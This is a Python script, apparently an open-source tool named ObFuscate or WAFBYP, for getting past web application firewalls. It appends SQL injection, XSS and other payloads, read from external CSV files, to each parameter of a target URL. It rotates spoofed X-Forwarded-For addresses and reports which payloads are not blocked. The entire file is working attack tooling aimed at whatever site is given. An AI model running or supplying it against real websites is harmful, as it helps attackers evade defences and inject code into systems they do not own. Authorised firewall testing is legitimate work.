import argparse
import requests
import sys
import time
from urllib.parse import urlparse, urlencode, urlunparse, parse_qs
from collections import Counter
from termcolor import colored
from random import sample

def banner():
    print(colored("""
    ________ ___.   ___________                          __          
    \_____  \\_ |__ \_   _____/_ __  ______ ____ _____ _/  |_  ____  
     /   |   \| __ \ |    __)|  |  \/  ___// ___\\__  \\   __\/ __ \ 
    /    |    \ \_\ \|     \ |  |  /\___ \\  \___ / __ \|  | \  ___/ 
    \_______  /___  /\___  / |____//____  >\___  >____  /__|  \___  >
            \/    \/     \/             \/     \/     \/          \/ 
                                                    
        ObFuscate - A tool for bypassing WAFs using obfuscation techniques.
                    By [Gaurav Bhattacharjee] (@0xgh057r3c0n)
    """, 'cyan'))

def print_result(success, base_url, param_list, payload, status_code):
    # Create URL with payload
    url_with_payload = urlunparse((
        urlparse(base_url).scheme,
        urlparse(base_url).netloc,
        urlparse(base_url).path,
        urlparse(base_url).params,
        urlencode(param_list),
        urlparse(base_url).fragment
    ))
    if success:
        print(colored(f"✔ [{payload}] [{url_with_payload}] --> <successful> Response Status: {status_code}", 'green'))
    else:
        print(colored(f"✘ [{payload}] [{url_with_payload}] --> <failed> Response Status: {status_code}", 'red'))

def main():
    parser = argparse.ArgumentParser(description='WAFBYP - Analyzing parameters with payloads to benchmark WAFs.')
    required = parser.add_argument_group('required arguments')
    required.add_argument('-u', '--url', help='Target URL (http://www.example.com/page.php?parameter=value)', required=True)
    parser.add_argument('-a', '--useragent', help='Set custom user-agent string')
    parser.add_argument('-d', '--delay', help='Set delay between requests (seconds)', type=float)
    parser.add_argument('-r', '--randip', action='store_true', help='Random IP for X-Forwarded-For')
    parser.add_argument('-x', '--proxy', help='Set proxy (https://IP:PORT)')
    parser.add_argument('-p', '--post', help='Data string to be sent through POST (parameter=value&also=another)')
    parser.add_argument('-c', '--cookie', help='HTTP Cookie header')
    parser.add_argument('-t', '--type', help='Type of payload [sqli | xss | others]', choices=['sql', 'xss', 'others', 'all'], default='all')
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(0)
    args = parser.parse_args()

    banner()

    url = args.url
    print(colored("  URL: " + url, 'yellow'))

    parsed_uri = urlparse(url)
    base_url = urlunparse((
        parsed_uri.scheme,
        parsed_uri.netloc,
        parsed_uri.path,
        parsed_uri.params,
        '',
        parsed_uri.fragment
    ))
    param_list = {}
    proxies = {}
    headers = {}

    # Proxy
    if args.proxy:
        if "https" in args.proxy[:5]:
            proxies['https'] = args.proxy
        elif "http" in args.proxy[:4]:
            proxies['http'] = args.proxy
        else:
            print(colored("\r\n\tSomething wrong with proxy, please check WAFBYP usage!!!\r\n", 'red'))
            sys.exit()

    # Random IP
    def randomIP():
        numbers = []
        while not numbers or numbers[0] in (10, 172, 192):
            numbers = sample(range(1, 255), 4)
        return '.'.join(str(_) for _ in numbers)

    # Headers
    if args.useragent:
        headers['user-agent'] = args.useragent
    else:
        headers['user-agent'] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36"
    if args.randip:
        headers['X-Forwarded-For'] = randomIP()
    if args.cookie:
        headers['cookie'] = args.cookie

    # Check if the target is up
    try:
        r = requests.get(base_url, proxies=proxies, headers=headers, allow_redirects=False, timeout=20)
        r.raise_for_status()
    except (requests.exceptions.ConnectionError, requests.exceptions.Timeout):
        print(colored("\r\nTarget appears to be down!!\r\n", 'red'))
        sys.exit()

    # Header checking
    header_changed = 0
    req_header = requests.get(url, headers=headers, proxies=proxies, allow_redirects=False, timeout=10)
    req_header_attack = requests.get(url, params={'test': '%00'}, headers=headers, proxies=proxies, allow_redirects=False, timeout=10)
    if req_header_attack.status_code == req_header.status_code:
        len_req_header = int(len(''.join(req_header.headers.values()))) - int(len(req_header.headers.get('Content-Length', '')))
        len_req_header_attack = int(len(''.join(req_header_attack.headers.values()))) - int(len(req_header_attack.headers.get('Content-Length', '')))
        if len_req_header != len_req_header_attack:
            print(colored("\r\n\tThe server header is different when an attack is detected.\r\n", 'yellow'))
            header_changed = 1

    # Parsing parameters from URL
    query_params = parse_qs(parsed_uri.query)
    param_list.update({k: v[0] for k, v in query_params.items()})

    if args.post:
        paramp = args.post.split("&")
        param_list.update(dict(p.split("=") for p in paramp))

    payloads = {}

    def file2dic(filename):
        with open(filename, 'r') as f:
            for line in f:
                param_split = line.rpartition('@')
                payloads[param_split[0]] = param_split[2]

    # Load payloads
    if args.type == "xss":
        file2dic('payloads/XSS_Payloads.csv')
    elif args.type == "sql":
        file2dic('payloads/SQLi_Payloads.csv')
    elif args.type == "others":
        file2dic('payloads/other_Payloads.csv')
    elif args.type == "all":
        file2dic('payloads/XSS_Payloads.csv')
        file2dic('payloads/SQLi_Payloads.csv')
        file2dic('payloads/other_Payloads.csv')

    for name_m, value_m in param_list.items():
        print(colored("\r\n<Parameter Name> " + name_m + "\r\n", 'yellow'))

        params = {}
        rs = []
        c = 0
        trycount = 0
        succ = 0
        fai = 0

        for payload, string in payloads.items():
            c += 1
            if args.delay:
                time.sleep(args.delay)
            if payload[:1] in ["'", "\""]:
                param_list[name_m] = value_m + payload
            else:
                param_list[name_m] = value_m + "' " + payload

            # Define URL with payload
            url_with_payload = urlunparse((
                parsed_uri.scheme,
                parsed_uri.netloc,
                parsed_uri.path,
                parsed_uri.params,
                urlencode(param_list),
                parsed_uri.fragment
            ))

            # Send Request
            for i in range(3):
                try:
                    if args.post:
                        req = requests.post(url, data=param_list, headers=headers, proxies=proxies, allow_redirects=False, timeout=10)
                    else:
                        req = requests.get(url_with_payload, headers=headers, proxies=proxies, allow_redirects=False, timeout=10)
                    req.raise_for_status()
                    len_req = int(len(''.join(req.headers.values()))) - int(len(req.headers.get('Content-Length', '')))
                    if not ((req.status_code == req_header_attack.status_code) and (len_req == len_req_header_attack) and (header_changed == 1)):
                        string = string[:-1]
                        print_result(True, base_url, param_list, payload, req.status_code)
                        succ += 1
                    else:
                        print_result(False, base_url, param_list, payload, req.status_code)
                        fai += 1
                    rs.append(req.status_code)
                    break  # Exit the retry loop on success

                except (requests.exceptions.ConnectionError, requests.exceptions.Timeout):
                    print(colored("Retrying ... [" + payload + "]", 'yellow'))
                    trycount += 1
                    continue
                except requests.exceptions.HTTPError as e:
                    if req.status_code == 403:
                        print(colored(f"403 Forbidden for payload [{payload}] at URL [{url_with_payload}]", 'red'))
                        fai += 1

if __name__ == "__main__":
    main()
